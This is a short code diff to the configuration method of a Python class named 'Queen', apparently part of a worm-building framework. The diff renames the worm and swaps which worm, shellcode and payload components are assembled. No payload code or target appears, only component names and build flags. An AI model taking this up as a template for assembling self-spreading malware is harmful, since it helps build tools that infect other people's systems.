@@ -82,20 +82,28 @@ class Queen:
 
         conf["FLAG_NO_COMPILE"] = True
         # conf["BUILD_PAYLOAD"] = True
-        # conf["MODULE_INFO"] = "My first shellcode FOOD."
+        # conf["MODULE_INFO"] = "Big payload in python for test."
         #conf["BUILD_SHELLCODE_PAYLOAD"] = True
         # conf["BUILD_SHELLCODE_FOOD"] = True
 
         # self.showItems("worm")
 
-        self.setWormName("monteczek")
-        self.addWormItem("worm", "Montezuma")
-        self.addWormItem("module", "PyAnts")
-        self.setVariable("PYA_fext", "jpg, bmp")
-        self.addWormItem("module", "PyRawTcp")
+        self.setWormName("jogibear")
+        self.addWormItem("worm", "WShellcode")
+        self.addWormItem("scode", "PyYogi")
+        self.addWormItem("payload", "BigMama")
+        # self.addWormItem("module", "PyAnts")
+        # self.setVariable("PYA_fext", "jpg, bmp")
+        # self.addWormItem("module", "PyRawTcp")
         # self.addWormItem("module", "PyDcWeb")
         # self.addWormItem("worm", "WShellcode")
         # self.addWormItem("scode", "WEPy")
+
+        # self.setWormName("BigMama")
+        # self.addWormItem("worm","Montezuma")
+        # self.addWormItem("module", "PyRawTcp")
+        # self.addWormItem("module", "PyAnts")
+        # self.addWormItem("shadow", "DigDug")
 
 
         # self.addWormItem("worm", "PayTest")
@@ -153,7 +161,7 @@ class Queen:
 
     def Run(self) -> None:
         self.enter()
-        #self.test()
+        
 
 
 
